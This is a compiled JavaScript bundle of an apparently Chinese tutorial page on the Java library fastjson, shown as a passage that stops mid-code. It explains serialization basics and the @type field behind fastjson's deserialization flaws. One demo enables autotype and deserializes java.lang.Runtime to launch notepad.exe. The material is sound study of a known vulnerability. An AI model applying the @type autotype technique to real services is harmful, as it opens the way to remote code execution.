"use strict";(self.webpackChunkone_piece=self.webpackChunkone_piece||[]).push([[336],{7708:(n,s)=>{s.A=(n,s)=>{const a=n.__vccOpts||n;for(const[n,t]of s)a[n]=t;return a}},9356:(n,s,a)=>{a.r(s),a.d(s,{comp:()=>In,data:()=>Bn});var t=a(4754);const e=a.p+"assets/img/image-20240410102212-68l5ov9.33f98da1.png",p=a.p+"assets/img/image-20240410103444-39u942g.ff29ed6f.png",o=a.p+"assets/img/image-20240410104138-99j2do1.dc3eaef9.png",c=a.p+"assets/img/image-20240410105019-k4489mb.c9ea5c87.png",l=a.p+"assets/img/image-20240410113026-d82i252.a06b6811.png",i=a.p+"assets/img/image-20240410133920-0ay0ab9.f4d8f7f9.png",u=a.p+"assets/img/image-20240410134240-15ouxe2.e49dc772.png",r=a.p+"assets/img/image-20240410141121-u3bq855.bb746963.png",k=a.p+"assets/img/image-20240410154558-7epb8u7.df736ec1.png",d=a.p+"assets/img/image-20240410160358-qwvtvlb.cc27f92b.png",m=a.p+"assets/img/image-20240410161748-kcfguaw.73de6493.png",v=a.p+"assets/img/image-20240410163734-nlktkpm.f3715b70.png",b=a.p+"assets/img/image-20240410165457-fokb9j4.0d220e62.png",g=a.p+"assets/img/image-20240410183400-r4dnyic.a4f30ec9.png",y=a.p+"assets/img/image-20240410174921-pl0auel.034b0ccb.png",f=a.p+"assets/img/image-20240410174955-lxxjvhx.b1a34f38.png",h=a.p+"assets/img/image-20240416154806-47p0r3i.52bde09b.png",j=a.p+"assets/img/image-20240416171629-nzk32k5.dccd21d3.png",A=a.p+"assets/img/image-20240416171855-35uhwzn.04bf2428.png",w=a.p+"assets/img/image-20240416171957-gakvpop.d2c3ede3.png",S=a.p+"assets/img/image-20240416172752-1bhttls.2904a3cf.png",q=a.p+"assets/img/image-20240416172825-rpzhrgj.9b1686af.png",x=a.p+"assets/img/image-20240412175147-4b66dkt.91055659.png",J=a.p+"assets/img/image-20240413104608-jk636eb.2d6dd914.png",O=a.p+"assets/img/image-20240413114422-jq015va.ad5a57a2.png",E=a.p+"assets/img/image-20240413115324-dgtp6k2.50bfc5ad.png",N=a.p+"assets/img/image-20240414003049-1wqzvqm.e4c9b130.png",I=a.p+"assets/img/image-20240417180104-3bquum3.cb836691.png",B=a.p+"assets/img/image-20240418091019-6jresq6.41eee1ff.png",T=a.p+"assets/img/image-20240418093126-hhjja54.5658c660.png",F=a.p+"assets/img/image-20240418093556-qbx89nd.57d88826.png",C=a.p+"assets/img/image-20240418100130-zsl439u.eed88cb5.png",P=a.p+"assets/img/image-20240414124234-ddps6j5.42319a43.png",z=a.p+"assets/img/image-20240417172957-7aksbyt.b6b4adc4.png",D=a.p+"assets/img/image-20240417173110-zxvvvi6.fac68e34.png",R=a.p+"assets/img/image-20240417173856-ad706zi.439e0a7c.png",L=a.p+"assets/img/image-20240417174306-u1hmv7b.e2f4a776.png",M=a.p+"assets/img/image-20240418122605-nbniqxg.d42094a1.png",W=a.p+"assets/img/image-20240418113224-xs89v4j.afa53014.png",_=a.p+"assets/img/image-20240418122437-fo0p64x.c0ed2357.png",U=a.p+"assets/img/image-20240418140646-t1l9vqa.04777add.png",Y=a.p+"assets/img/image-20240418140216-8pmxsa3.4a980103.png",G=a.p+"assets/img/image-20240418142119-npyddq3.254e160d.png",V=a.p+"assets/img/image-20240418144606-qpu87oe.0022a6e1.png",Q=a.p+"assets/img/image-20240418145825-zpm6as7.2e9de43d.png",X=a.p+"assets/img/image-20240418150145-mnkpciu.8763851d.png",Z=a.p+"assets/img/image-20240418152937-fny6ckb.f6d3ba40.png",H=a.p+"assets/img/image-20240418153230-s2xlncj.fe1f3b37.png",K=a.p+"assets/img/image-20240418161910-2lc6gco.5a85bfa0.png",$=a.p+"assets/img/image-20240418161717-exo7y0w.e73174ca.png",nn=a.p+"assets/img/image-20240418161804-rwuz9uj.b7d29886.png",sn=a.p+"assets/img/image-20240418162412-cpuaswu.a2629813.png",an=a.p+"assets/img/image-20240418163426-wp7n1k0.1cfbb3c1.png",tn=a.p+"assets/img/image-20240418164449-5w09eoi.131c09e3.png",en=a.p+"assets/img/image-20240418165007-4a7derb.01ecbefe.png",pn={href:"https://github.com/alibaba/fastjson",target:"_blank",rel:"noopener noreferrer"},on=(0,t.Lk)("h2",{id:"什么是-fastjson",tabindex:"-1"},[(0,t.Lk)("a",{class:"header-anchor",href:"#什么是-fastjson"},[(0,t.Lk)("span",null,"什么是 fastjson")])],-1),cn={href:"https://github.com/alibaba/fastjson",target:"_blank",rel:"noopener noreferrer"},ln=(0,t.Fv)('<ul><li>Provide simple <code>toJSONString()</code>​ and <code>parseObject()</code>​ methods to convert Java objects to JSON and vice-versa</li><li>Allow pre-existing unmodifiable objects to be converted to and from JSON</li><li>Extensive support of Java Generics</li><li>Allow custom representations for objects</li><li>Support arbitrarily complex objects (with deep inheritance hierarchies and extensive use of generic types)</li></ul><p>简单来说就是一个功能特性极其丰富的 Json 解析库 Java 版。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建"><span>环境搭建</span></a></h2>',3),un=(0,t.Lk)("li",null,"在 IDEA 中新建一个 maven 项目，并引入 fastjson 依赖。",-1),rn=(0,t.Lk)("li",null,[(0,t.eW)("在 pom.xml 中添加 fastjson 依赖并 "),(0,t.Lk)("code",null,"Reload All Maven Projects"),(0,t.eW)("​。")],-1),kn={href:"https://mvnrepository.com/artifact/com.alibaba/fastjson",target:"_blank",rel:"noopener noreferrer"},dn=(0,t.Fv)('<p>​<img src="'+e+'" alt="image" loading="lazy">​</p><p>​<img src="'+p+'" alt="image" loading="lazy">​</p><p>​<img src="'+o+'" alt="image" loading="lazy">​</p><h2 id="测试-demo" tabindex="-1"><a class="header-anchor" href="#测试-demo"><span>测试 Demo</span></a></h2><p>创建一个 demo package 和一个 Test 类。</p><p>​<img src="'+c+'" alt="image" loading="lazy">​</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>\n    <span class="token doc-comment comment">/**\n     * 定义一个简单的静态内部 Java 类\n     * 1. 可以直接通过外部类名来访问，无需先创建外部类的实例。\n     * 2. 可以访问外部类的静态成员和方法，但不能直接访问外部类的非静态成员和方法。\n     * 3. 静态内部类可以包含静态成员、静态方法，也可以包含非静态成员和方法。\n     * 4. 静态内部类的实例不持有外部类的引用，因此不会造成内存泄漏。\n     * 5. 静态内部类与外部类之间的关系更像是普通的类之间的关系，而不是内部类和外部类之间的关系。\n     */</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>\n        <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>\n        <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>\n\n        <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>\n            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">return</span> name<span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">return</span> age<span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n    <span class="token punctuation">}</span>\n\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token comment">// 将一个 Java 对象序列化为 Json 字符串</span>\n        <span class="token class-name">Person</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">&quot;Aaa&quot;</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">String</span> jsonString1 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>person1<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonString1<span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n        <span class="token comment">// 将一个 Json 字符串反序列化为 Java 对象</span>\n        <span class="token class-name">String</span> jsonString2 <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;age\\&quot;:88, \\&quot;name\\&quot;:\\&quot;Bbb\\&quot;}&quot;</span><span class="token punctuation">;</span>\n        <span class="token class-name">Person</span> person2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString2<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;, &quot;</span> <span class="token operator">+</span> person2<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n        <span class="token comment">// 输出这个由 fastjson 创建的 Person 类对象</span>\n        <span class="token class-name">String</span> jsonString3 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>person2<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonString3<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+l+'" alt="image" loading="lazy">​</p><h3 id="疑问一-映射关系" tabindex="-1"><a class="header-anchor" href="#疑问一-映射关系"><span>疑问一：映射关系</span></a></h3><p>​<code>Person person2 = JSON.parseObject(jsonString2, Person.class);</code>​</p><p>这里为什么可以直接使用 Person.class 来进行映射？</p><p>在使用 <code>fastjson</code>​ 时，我们需要先将 <code>JSON</code>​ 字符串和 <code>Java</code>​ 对象之间建立映射关系，可以通过类的属性和 <code>JSON</code>​ 字段名进行映射。在我们上面的代码中，<code>Java</code>​ 类的属性名和 <code>JSON</code>​ 字段名是相同的，因此可以直接使用 <code>Person.class</code>​ 来进行映射。</p><p><strong>如果不同我们该怎么办？</strong> 我们可以通过使用注解来指定它们之间的映射关系。在 <code>fastjson</code>​ 中，可以使用 <code>@JSONField</code>​ 注解来指定 <code>Java</code>​ 类的属性和 <code>JSON</code>​ 字段之间的映射关系。</p><ul><li>在 Person 类属性上添加注解映射</li><li>使用对应的 Json 字段名（key）</li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token annotation punctuation">@JSONField</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">&quot;user_name&quot;</span><span class="token punctuation">)</span>\n<span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>\n<span class="token annotation punctuation">@JSONField</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">&quot;user_age&quot;</span><span class="token punctuation">)</span>\n<span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>\n\n<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>\n<span class="token class-name">String</span> jsonString2 <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;user_name\\&quot;:\\&quot;Bbb\\&quot;,\\&quot;user_age\\&quot;:88}&quot;</span><span class="token punctuation">;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+i+'" alt="image" loading="lazy">​</p><h3 id="疑问二-顺序关系" tabindex="-1"><a class="header-anchor" href="#疑问二-顺序关系"><span>疑问二：顺序关系</span></a></h3><p>为什么我初始化对象的时候，代码明明写的是：</p><p>​<code>Person person1 = new Person(&quot;Aaa&quot;, 99);</code></p><p>name 在前，age 在后，怎么转化成 json 字符串的时候就变成了 age 在前，name 在后了？</p><p>原来，在 <code>fastjson</code>​ 中，<strong>默认情况下</strong>，生成的 <code>JSON</code>​ 字符串的顺序是按照<strong>属性的字母顺序</strong>进行排序的，而不是按照属性在类中的声明顺序。如果我们希望按照属性在类中的声明顺序来生成 <code>JSON</code>​ 字符串，可以通过在类中使用 <code>@JSONType</code>​ 注解来设置属性的序列化顺序。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// 在类前用注解声明属性顺序</span>\n<span class="token annotation punctuation">@JSONType</span><span class="token punctuation">(</span>orders <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+u+'" alt="image" loading="lazy">​</p><h3 id="疑问三-type​" tabindex="-1"><a class="header-anchor" href="#疑问三-type​"><span>疑问三：<code>@type</code>​</span></a></h3><p>​<code>@type</code>​ 是什么东西？如何反序列化带 <code>@type</code>​ 的 json 字符串？</p>',25),mn={href:"https://www.cnblogs.com/nice0e3/p/14601670.html",target:"_blank",rel:"noopener noreferrer"},vn=(0,t.Fv)('<p>很多讲 <code>fastjson</code>​ 反序列化漏洞的文章，里面都提到了 <code>@type</code>​，那么它到底是什么呢？</p><p>​<code>@type</code>​ 是 <code>fastjson</code>​ 中的一个<mark>特殊注解</mark>，用于标识 <code>JSON</code>​ 字符串中的某个属性是一个 <code>Java</code>​ 对象的类型。</p><p>具体来说，当 <code>fastjson</code>​ 从 <code>JSON</code>​ 字符串反序列化为 <code>Java</code>​ 对象时，如果 <code>JSON</code>​ 字符串中包含 <code>@type</code>​ 属性，<code>fastjson</code>​ 会根据该属性的值来确定反序列化后的 <code>Java</code>​ 对象的类型。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>\n        <span class="token class-name">String</span> fastjson <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;java.lang.Runtime\\&quot;,\\&quot;@type\\&quot;:\\&quot;java.lang.Runtime\\&quot;,\\&quot;@type\\&quot;:\\&quot;java.lang.Runtime\\&quot;}&quot;</span><span class="token punctuation">;</span>\n        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAccept</span><span class="token punctuation">(</span><span class="token string">&quot;java.lang&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>fastjson<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&quot;notepad.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行上面的代码会打开记事本。</p><p>由于 <code>fastjson</code>​ 在 <code>1.2.24</code>​ 之后默认禁用 Autotype，因此这里我们通过 <code>ParserConfig.getGlobalInstance().addAccept(&quot;java.lang&quot;);</code>​ 来开启，否则会报错 <code>autoType is not support</code>​。【目前我们搭建的环境使用的是 1.2.50 版本】</p><p>​<img src="'+r+'" alt="image" loading="lazy">​</p><p>​ <strong>【SerializerFeature.WriteClassName】</strong> ​</p><p>和前面代码做对比，发现其实就是在调用 <code>toJSONString</code>​ 方法的时候，参数里面多了一个 <code>SerializerFeature.WriteClassName</code>​ 方法。</p><p>JSON 标准是不支持自省的，也就是说根据 JSON 文本，不知道它包含的对象的类型。传入 <code>SerializerFeature.WriteClassName</code>​ 可以使得 <code>Fastjson</code>​ 支持&quot;内省（Introspection）&quot;[^1]，开启自省后序列化成 <code>JSON</code>​ 的数据就会多一个 <code>@type</code>​，这个是代表对象类型的 <code>JSON</code>​ 文本。</p><p>​<code>FastJson</code>​ 的漏洞就是他的这一个功能产生的，在对该 <code>JSON</code>​ 数据进行反序列化的时候，会去调用指定类中对于的 <code>get/set/is</code>​ 方法， 后面会详细分析。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JSONField</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JSONType</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializerFeature</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>\n    <span class="token annotation punctuation">@JSONType</span><span class="token punctuation">(</span>orders <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>\n        <span class="token annotation punctuation">@JSONField</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">&quot;user_name&quot;</span><span class="token punctuation">)</span>\n        <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>\n        <span class="token annotation punctuation">@JSONField</span><span class="token punctuation">(</span>name\n                <span class="token operator">=</span> <span class="token string">&quot;user_age&quot;</span><span class="token punctuation">)</span>\n        <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>\n\n        <span class="token comment">// ... 构造函数、setter、getter</span>\n\n        <span class="token annotation punctuation">@Override</span>\n        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token keyword">return</span> <span class="token string">&quot;Person{&quot;</span> <span class="token operator">+</span>\n                    <span class="token string">&quot;name=&#39;&quot;</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token char">&#39;\\&#39;&#39;</span> <span class="token operator">+</span>\n                    <span class="token string">&quot;, age=&quot;</span> <span class="token operator">+</span> age <span class="token operator">+</span>\n                    <span class="token char">&#39;}&#39;</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n    <span class="token punctuation">}</span>\n\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>\n        <span class="token class-name">Person</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        user<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        user<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">&quot;zhaocai&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n        <span class="token comment">// 将 Java 对象转换为 Json 字符串</span>\n        <span class="token class-name">String</span> s1 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> <span class="token class-name">SerializerFeature<span class="token punctuation">.</span>WriteClassName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+k+'" alt="image" loading="lazy">​</p><p>然后我们就可以通过以下三种方式来反序列化 <code>json</code>​ 字符串了。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// 方法一：返回 JSONObject 对象</span>\n<span class="token class-name">Person</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nperson1<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nperson1<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">&quot;zhaocai_1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token class-name">String</span> s1 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>person1<span class="token punctuation">,</span> <span class="token class-name">SerializerFeature<span class="token punctuation">.</span>WriteClassName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token class-name">Object</span> jsonObject <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonObject <span class="token operator">+</span> <span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token comment">// 方法二：返回 Person 对象</span>\n<span class="token class-name">Person</span> person2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nperson2<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nperson2<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">&quot;zhaocai_2&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token class-name">String</span> s2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>person2<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token class-name">Person</span> person2_2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>s2<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> \n<span class="token comment">// 非自省</span>\n<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person2_2 <span class="token operator">+</span> <span class="token string">&quot;\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token comment">// 方法三：返回 Person 对象</span>\n<span class="token class-name">Person</span> person3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span 